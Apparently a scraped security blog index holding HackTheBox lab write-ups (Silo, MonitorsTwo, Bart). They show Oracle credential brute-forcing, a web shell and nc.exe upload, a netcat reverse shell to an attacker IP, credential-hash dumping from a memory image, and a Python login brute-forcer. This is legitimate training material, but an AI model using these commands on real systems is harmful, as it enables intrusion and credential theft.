by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-07 17:29:51 [DATA] max 16 tasks per 1 server, overall 16 tasks, 737 login tries (l:737/p:1), ~47 tries per task [DATA] attacking oracle-sid://10.10.10.82:1521/ [1521][oracle-sid] host: 10.10.10.82 [1521][oracle-sid] host: 10.10.10.82 login: CLRExtProc [1521][oracle-sid] host: 10.10.10.82 login: PLSExtProc [STATUS] 556.00 tries/min, 556 tries in 00:01h, 181 to do in 00:01h, 16 active [1521][oracle-sid] host: 10.10.10.82 login: XE 1 of 1 target successfully completed, 4 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-07 17:31:12 We have 3 SIDs: XE, CLRExtProc, PLSExtProc Now we need to brute force user and password https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener#user-pass-bruteforce /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt I used odat passwordguesser with 2 different wordlists └─$ sudo odat passwordguesser -s 10.10.10.82 -d XE --accounts-file /home/kali/Documents/Tools/accounts.txt [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521 18:04:06 WARNING -: The line \u0026#39;jl/jl/\\n\u0026#39; is not loaded in credentials list: [\u0026#39;jl\u0026#39;, \u0026#39;jl\u0026#39;, \u0026#39;\u0026#39;] 18:04:06 WARNING -: The line \u0026#39;ose$http$admin/invalid/password\\n\u0026#39; is not loaded in credentials list: [\u0026#39;ose$http$admin\u0026#39;, \u0026#39;invalid\u0026#39;, \u0026#39;password\u0026#39;] The login brio_admin has already been tested at least once. What do you want to do: | ETA: --:--:-- - stop (s/S) - continue and ask every time (a/A) - skip and continue to ask (p/P) - continue without to ask (c/C) c [!] Notice: \u0026#39;ctxsys\u0026#39; account is locked, so skipping this username for password | ETA: 00:13:45 [!] Notice: \u0026#39;hr\u0026#39; account is locked, so skipping this username for password | ETA: 00:12:32 [!] Notice: \u0026#39;mdsys\u0026#39; account is locked, so skipping this username for password | ETA: 00:10:18 [!] Notice: \u0026#39;dbsnmp\u0026#39; account is locked, so skipping this username for password | ETA: 00:08:30 [!] Notice: \u0026#39;dip\u0026#39; account is locked, so skipping this username for password####### | ETA: 00:08:15 [!] Notice: \u0026#39;system\u0026#39; account is locked, so skipping this username for password############################################### | ETA: 00:05:40 [!] Notice: \u0026#39;xdb\u0026#39; account is locked, so skipping this username for password###################################################################################### | ETA: 00:03:16 [!] Notice: \u0026#39;outln\u0026#39; account is locked, so skipping this username for password################################################################################################# | ETA: 00:02:33 [+] Valid credentials found: scott/tiger. Continue... ############################################################################################################################################################ | ETA: 00:00:28 100% |#####################################################################################################################################################################################################################| Time: 00:12:20 [+] Accounts found on 10.10.10.82:1521/sid:XE: scott/tiger We found creds: scott:tiger Use sqlplus to connect └─$ sqlplus SCOTT/tiger@10.10.10.82:1521/XE SQL*Plus: Release 19.0.0.0.0 - Production on Thu Sep 7 18:43:19 2023 Version 19.6.0.0.0 Copyright (c) 1982, 2019, Oracle. All rights reserved. ERROR: ORA-28002: the password will expire within 7 days Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production SQL\u0026gt; Let\u0026rsquo;s check privileges SQL\u0026gt; select * from user_role_privs; USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SCOTT CONNECT NO YES NO SCOTT RESOURCE NO YES NO Let\u0026rsquo;s connect as sysdba or odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba └─$ sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba SQL*Plus: Release 19.0.0.0.0 - Production on Thu Sep 7 18:49:16 2023 Version 19.6.0.0.0 Copyright (c) 1982, 2019, Oracle. All rights reserved. Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production SQL\u0026gt; SQL\u0026gt; select * from user_role_privs; USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS ADM_PARALLEL_EXECUTE_TASK YES YES NO SYS APEX_ADMINISTRATOR_ROLE YES YES NO SYS AQ_ADMINISTRATOR_ROLE YES YES NO SYS AQ_USER_ROLE YES YES NO SYS AUTHENTICATEDUSER YES YES NO SYS CONNECT YES YES NO SYS CTXAPP YES YES NO SYS DATAPUMP_EXP_FULL_DATABASE YES YES NO SYS DATAPUMP_IMP_FULL_DATABASE YES YES NO SYS DBA YES YES NO SYS DBFS_ROLE YES YES NO USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS DELETE_CATALOG_ROLE YES YES NO SYS EXECUTE_CATALOG_ROLE YES YES NO SYS EXP_FULL_DATABASE YES YES NO SYS GATHER_SYSTEM_STATISTICS YES YES NO SYS HS_ADMIN_EXECUTE_ROLE YES YES NO SYS HS_ADMIN_ROLE YES YES NO SYS HS_ADMIN_SELECT_ROLE YES YES NO SYS IMP_FULL_DATABASE YES YES NO SYS LOGSTDBY_ADMINISTRATOR YES YES NO SYS OEM_ADVISOR YES YES NO SYS OEM_MONITOR YES YES NO USERNAME GRANTED_ROLE ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS PLUSTRACE YES YES NO SYS RECOVERY_CATALOG_OWNER YES YES NO SYS RESOURCE YES YES NO SYS SCHEDULER_ADMIN YES YES NO SYS SELECT_CATALOG_ROLE YES YES NO SYS XDBADMIN YES YES NO SYS XDB_SET_INVOKER YES YES NO SYS XDB_WEBSERVICES YES YES NO SYS XDB_WEBSERVICES_OVER_HTTP YES YES NO SYS XDB_WEBSERVICES_WITH_PUBLIC YES YES NO 32 rows selected. odat\u0026rsquo;s mind map We can try using utlfile and externaltable to upload binary and get reverse shell (but with no arguments) Or we can upload aspx and nc files via utlfile and get web shell └─$ odat utlfile -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile \u0026#39;C:\\inetpub\\wwwroot\u0026#39; nc.exe ~/Documents/Tools/nc64.exe [1] (10.10.10.82:1521): Put the /home/kali/Documents/Tools/nc64.exe local file in the C:\\inetpub\\wwwroot folder like nc.exe on the 10.10.10.82 server [+] The /home/kali/Documents/Tools/nc64.exe file was created on the C:\\inetpub\\wwwroot directory on the 10.10.10.82 server like the nc.exe file └─$ odat utlfile -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile \u0026#39;C:\\inetpub\\wwwroot\u0026#39; shell.aspx /usr/share/webshells/aspx/cmdasp.aspx [1] (10.10.10.82:1521): Put the /usr/share/webshells/aspx/cmdasp.aspx local file in the C:\\inetpub\\wwwroot folder like shell.aspx on the 10.10.10.82 server [+] The /usr/share/webshells/aspx/cmdasp.aspx file was created on the C:\\inetpub\\wwwroot directory on the 10.10.10.82 server like the shell.aspx file Now let\u0026rsquo;s get reverse shell c:\\inetpub\\wwwroot\\nc.exe 10.10.16.9 6666 -e cmd Root whoami c:\\windows\\system32\\inetsrv\u0026gt;whoami whoami iis apppool\\defaultapppool c:\\windows\\system32\\inetsrv\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled c:\\windows\\system32\\inetsrv\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Mandatory Label\\High Mandatory Level Label S-1-16-12288 Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group BUILTIN\\IIS_IUSRS Alias S-1-5-32-568 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group Unknown SID type S-1-5-82-0 Mandatory group, Enabled by default, Enabled group c:\\windows\\system32\\inetsrv\u0026gt; SeImpersonatePrivilege is Potato Privesc It works, check 0xdf We could also run odat ctxsys -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --getFile c:\\\\users\\\\administrator\\\\desktop\\\\root.txt oracle is running as nt/system, so we can get root via any C2 payload Let\u0026rsquo;s try another way Check for creds in files c:\\Users\u0026gt;WHERE /R . *.txt WHERE /R . *.txt c:\\Users\\All Users\\VMware\\VMware Tools\\manifest.txt c:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\adobeflashcs3.txt c:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\adobephotoshopcs3.txt c:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\googledesktop.txt c:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\microsoftoffice.txt c:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\vistasidebar.txt c:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\visualstudio2005.txt c:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\vmwarefilters.txt c:\\Users\\All Users\\VMware\\VMware Tools\\Unity Filters\\win7gadgets.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\AppData\\Local\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Desktop\\Oracle issue.txt c:\\Users\\Phineas\\Desktop\\user.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Application Data\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Local Settings\\Microsoft\\Internet Explorer\\brndlog.txt c:\\Users\\Phineas\\Desktop\\Oracle issue.txt looks interesting c:\\Users\u0026gt;type \u0026#34;c:\\Users\\Phineas\\Desktop\\Oracle issue.txt\u0026#34; type \u0026#34;c:\\Users\\Phineas\\Desktop\\Oracle issue.txt\u0026#34; Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested): Dropbox link provided to vendor (and password under separate cover). Dropbox link https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0 link password: �%Hm8646uC$ The password has a weird symbol I downloaded it to my box and its £%Hm8646uC$ vim can see it But had to install vim-gtk3 And used \u0026quot;+y after selecting the block in visual mode It\u0026rsquo;s a memory dump We need systeminfo c:\\Users\u0026gt;systeminfo systeminfo Host Name: SILO OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-00115-23036-AA976 Original Install Date: 12/31/2017, 11:01:23 PM System Boot Time: 9/7/2023, 4:31:35 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-gb;English (United Kingdom) Input Locale: en-us;English (United States) Time Zone: (UTC+00:00) Dublin, Edinburgh, Lisbon, London Total Physical Memory: 4,095 MB Available Physical Memory: 3,083 MB Virtual Memory: Max Size: 4,799 MB Virtual Memory: Available: 3,585 MB Virtual Memory: In Use: 1,214 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Now we only have to run volatility and dump the memory └─$ python3 volatility3/vol.py -f ~/Downloads/SILO-20180105-221806.dmp windows.lsadump.Lsadump Volatility 3 Framework 2.5.1 Progress: 100.00 PDB scanning finished Key Secret Hex DefaultPassword DoNotH@ckMeBro! 1e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 44 00 6f 00 4e 00 6f 00 74 00 48 00 40 00 63 00 6b 00 4d 00 65 00 42 00 72 00 6f 00 21 00 00 00 DPAPI_SYSTEM ,Ï%14®C-¬ò§tmC¨¦©Bb÷UpH»}þyI½ 2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 cf 25 94 31 34 9e ae 43 2d 8b 87 ac f2 a7 74 1c 6d ec 1c 04 08 43 a8 a6 a9 42 62 f7 55 70 48 bb 17 7d 82 fe 79 49 02 bd 00 00 00 00 └─$ python3 volatility3/vol.py -f ~/Downloads/SILO-20180105-221806.dmp windows.hashdump.Hashdump Volatility 3 Framework 2.5.1 Progress: 100.00 PDB scanning finished User rid lmhash nthash Administrator 500 aad3b435b51404eeaad3b435b51404ee 9e730375b7cbcebf74ae46481e07b0c7 Guest 501 aad3b435b51404eeaad3b435b51404ee 31d6cfe0d16ae931b73c59d7e0c089c0 Phineas 1002 aad3b435b51404eeaad3b435b51404ee 8eacdd67b77749e65d3b3d5c110b0969 We can use hash and connect as Administrator ","date":"September 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/silo/images/silo.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/silo/","summary":"Silo Enumeration nmap └─$ nmap -Pn -p- 10.10.10.82 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 16:33 BST Warning: 10.10.10.82 giving up on port because retransmission cap hit (6). Stats: 0:09:50 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 83.01% done; ETC: 16:45 (0:02:01 remaining) Nmap scan report for 10.10.10.82 (10.10.10.82) Host is up (0.14s latency). Not shown: 65512 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1521/tcp open oracle 5985/tcp open wsman 27464/tcp filtered unknown 30480/tcp filtered unknown 36752/tcp filtered unknown 46311/tcp filtered unknown 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49159/tcp open unknown 49160/tcp open unknown 49161/tcp open unknown 49162/tcp open unknown 54636/tcp filtered unknown 54826/tcp filtered unknown 63783/tcp filtered unknown 64449/tcp filtered unknown └─$ nmap -Pn -sC -sV 10.","tags":["HTB","oracle","odat","sqlplus","hydra","aspx","webshell","volatility","passthehash","rottenpotato","potato"],"title":"[HTB] Machine: Silo"},{"categories":null,"contents":"MonitorsTwo Enumeration nmap └─$ nmap -Pn -p- 10.10.11.211 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 11:23 EDT Nmap scan report for 10.10.11.211 (10.10.11.211) Host is up (0.22s latency). Not shown: 65524 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80,651,7371,18436,30798,35745,47472,50621,56574,57534 -sC -sV 10.10.11.211 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 12:05 EDT Nmap scan report for 10.10.11.211 (10.10.11.211) Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Login to Cacti Web Server Foothold If we google the version of cacti which is 1.2.22, we have https://www.exploit-db.com/exploits/51166 PoC We get our reverse shell User Enumerate the box We have a docker instance And have entrypoint.sh script which changes admin password in mysql And the creds for mysql which are root:root We can get users hashes We can try cracking marcus hash marcus:funkymonkey Connect via ssh Root If we check marcus\u0026rsquo;s mail, we see the message It states about CVE-2021-41091, CVE-2021-41103 and CVE-2021-33033 We could try CVE-2021-41091 https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure The PoC And it works 0xdf has a nice explanation of exploit ","date":"September 2, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/images/monitorstwo.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/","summary":"MonitorsTwo Enumeration nmap └─$ nmap -Pn -p- 10.10.11.211 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 11:23 EDT Nmap scan report for 10.10.11.211 (10.10.11.211) Host is up (0.22s latency). Not shown: 65524 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80,651,7371,18436,30798,35745,47472,50621,56574,57534 -sC -sV 10.10.11.211 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 12:05 EDT Nmap scan report for 10.10.11.211 (10.10.11.211) Host is up (0.","tags":["HTB","ubuntu","cacti","cve-2022-46169","command-injection","docker","john","cve-2021-41091","cve-2021-41103","capsh"],"title":"[HTB] Machine: MonitorsTwo"},{"categories":null,"contents":"Bart Enumeration nmap └─$ nmap -Pn -p- 10.10.10.81 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 16:59 BST Nmap scan report for 10.10.10.81 (10.10.10.81) Host is up (0.091s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http └─$ nmap -Pn -p80 -sC -sV 10.10.10.81 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 17:04 BST Nmap scan report for 10.10.10.81 (10.10.10.81) Host is up (0.22s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Did not follow redirect to http://forum.bart.htb/ |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows vhosts └─$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u \u0026#39;http://bart.htb/\u0026#39; -H \u0026#39;Host: FUZZ.bart.htb\u0026#39; -fs 0 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://bart.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.bart.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 0 ________________________________________________ [Status: 200, Size: 35529, Words: 2090, Lines: 549, Duration: 148ms] * FUZZ: forum [Status: 200, Size: 3423, Words: 385, Lines: 81, Duration: 1330ms] * FUZZ: monitor gobuster forum.bart.htb had not results └─$ gobuster dir -u http://monitor.bart.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error --exclude-length 75 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://monitor.bart.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 75 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/09/03 20:56:29 Starting gobuster in directory enumeration mode =============================================================== /docs (Status: 301) [Size: 152] [--\u0026gt; http://monitor.bart.htb/docs/] /index.php (Status: 200) [Size: 3423] /static (Status: 301) [Size: 154] [--\u0026gt; http://monitor.bart.htb/static/] /src (Status: 301) [Size: 151] [--\u0026gt; http://monitor.bart.htb/src/] /Index.php (Status: 200) [Size: 3423] /install.php (Status: 200) [Size: 3714] /vendor (Status: 301) [Size: 154] [--\u0026gt; http://monitor.bart.htb/vendor/] /config.php (Status: 200) [Size: 0] /Docs (Status: 301) [Size: 152] [--\u0026gt; http://monitor.bart.htb/Docs/] /cron (Status: 301) [Size: 152] [--\u0026gt; http://monitor.bart.htb/cron/] /INSTALL.php (Status: 200) [Size: 3714] /INDEX.php (Status: 200) [Size: 3423] forum.bart.htb monitor.bart.htb Foothold/User We found the employees One of them is commented We have http://monitor.bart.htb/?action=forgot Maybe we should brute-force the monitor.bart.htb Since we have an error message indicating that the user doesn\u0026rsquo;t exist Let\u0026rsquo;s generate username list and password list We can try validate usernames by using http://monitor.bart.htb/?action=forgot For usernames, we can use username-anarchy Samantha Brown Daniel Simmons Robert Hilton Harvey Potter Jane Doe └─$ ./username-anarchy --input-file username.list samantha samanthabrown samantha.brown samabrow samanthab s.brown sbrown bsamantha b.samantha browns brown brown.s brown.samantha sb daniel danielsimmons daniel.simmons danielsi danisimm daniels d.simmons dsimmons sdaniel s.daniel simmonsd simmons simmons.d simmons.daniel ds robert roberthilton robert.hilton roberthi robehilt roberth r.hilton rhilton hrobert h.robert hiltonr hilton hilton.r hilton.robert rh harvey harveypotter harvey.potter harveypo harvpott harveyp h.potter hpotter pharvey p.harvey potterh potter potter.h potter.harvey hp jane janedoe jane.doe janed j.doe jdoe djane d.jane doej doe doe.j doe.jane jd For passwords we use CeWL └─$ cewl -w passwords.list -e -a http://forum.bart.htb CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/) └─$ cat passwords.list and our ipsum BART info sit amet eget nulla the team for ... Theme aThemes Adapted modified colophon page Just simple post Email addresses found --------------------- Mailinfo@bart.htb We can write our own script or use Burp Intruder for finding usernames Send request to Burp Intruder Set attack type to Sniper Add user_name to payloads Add the list we generated to payload list Start the attack We found 2 users: daniel and harvey Now let\u0026rsquo;s try bruteforcing the password I combined usernames list and passwords list henry:potter import re import sys import requests import itertools from multiprocessing import Pool MAX_PROC = 50 #\u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf\u0026#34; value=\u0026#34;aab59572a210c4ee1f19ab55555a5d829e78b8efdbecd4b2f68bd485d82f0a57\u0026#34; /\u0026gt; csrf_pattern = re.compile(\u0026#39;name=\u0026#34;csrf\u0026#34; value=\u0026#34;(\\w+)\u0026#34; /\u0026#39;) def check_passwd(username, password): # CSRF and PHPSESSID r = requests.get(url) csrf = re.search(csrf_pattern, r.text).group(1) PHPSESSID = [x.split(\u0026#39;=\u0026#39;)[1] for x in r.headers[\u0026#39;Set-Cookie\u0026#39;].split(\u0026#39;;\u0026#39;) if x.split(\u0026#39;=\u0026#39;)[0] == \u0026#39;PHPSESSID\u0026#39;][0] data = {\u0026#34;csrf\u0026#34;: csrf, \u0026#34;user_name\u0026#34;: username, \u0026#34;user_password\u0026#34;: password, \u0026#34;action\u0026#34;: \u0026#34;login\u0026#34;} headers = {\u0026#39;Cookie\u0026#39;: f\u0026#34;PHPSESSID={PHPSESSID}\u0026#34;} r = requests.post(url, data=data, headers=headers) if \u0026#39;\u0026lt;p\u0026gt;The information is incorrect.\u0026lt;/p\u0026gt;\u0026#39; in r.text: return username, password, False else: return username, password, True def attack(usernames, wordlist, nprocs=MAX_PROC): with open(wordlist, \u0026#39;r\u0026#39;) as f: passwords = f.read().rstrip().replace(\u0026#39;\\r\u0026#39;,\u0026#39;\u0026#39;).split(\u0026#39;\\n\u0026#39;) pool = Pool(processes=nprocs) for username, password, status in pool.starmap(check_passwd, list(itertools.product(usernames,passwords))): if status: sys.stdout.write(f\u0026#34;\\n[+] Found password =\u0026gt; {username}:{password} \\n\u0026#34;) pool.terminate() sys.exit(0) print(\u0026#34;\\n\\nPassword not found\\n\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: url = \u0026#34;http://monitor.bart.htb/\u0026#34; usernames = [\u0026#34;daniel\u0026#34;, \u0026#34;harvey\u0026#34;] wordlist = sys.argv[1] attack(usernames, wordlist) Now since we found a password We can login to http://monitor.bart.htb New domain: internal-01.bart.htb internal-01.bart.htb Previous creds don\u0026rsquo;t work gobuster └─$ gobuster dir -u http://internal-01.bart.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error --exclude-length 75 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://internal-01.bart.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 75 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/09/04 12:19:37 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 4] [--\u0026gt; simple_chat/login_form.php] /log (Status: 301) [Size: 155] [--\u0026gt; http://internal-01.bart.htb/log/] /Index.php (Status: 302) [Size: 4] [--\u0026gt; simple_chat/login_form.php] /sql (Status: 301) [Size: 155] [--\u0026gt; http://internal-01.bart.htb/sql/] /INDEX.php (Status: 302) [Size: 4] [--\u0026gt; simple_chat/login_form.php] /SQL (Status: 301) [Size: 155] [--\u0026gt; http://internal-01.bart.htb/SQL/] /Log (Status: 301) [Size: 155] [--\u0026gt; http://internal-01.bart.htb/Log/] └─$ gobuster dir -u http://internal-01.bart.htb/simple_chat/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error 